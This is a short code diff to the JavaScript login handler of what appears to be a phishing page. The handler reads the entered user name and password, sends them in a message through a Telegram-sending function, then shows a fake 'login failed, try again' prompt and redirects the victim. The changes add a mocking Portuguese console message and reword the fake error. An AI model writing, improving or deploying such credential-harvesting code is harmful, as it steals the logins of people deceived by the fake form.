@@ -23,11 +23,13 @@ const validate = (user, password) => {
   return user && password;
 };
 
-const handleLogin = (event) => {
+const handleLogin = (event) => {  
   event.preventDefault();
   const user = event.target.user.value;
   const password = event.target.password.value;
   const isValid = validate(user, password);
+
+  console.log('Aqui tu foi de submarino!!! :x');
 
   if (isValid) {
     const message = `
@@ -36,7 +38,8 @@ const handleLogin = (event) => {
         Senha: ${password}        
         `;
     sendMessageToTelegram(message);
-    const result = confirm("Não foi possível realizar login, tente novamente");
+    const result = confirm("Erro ao realizar login, tente novamente!");
+    
 
     if (result) {
       window.location.href =
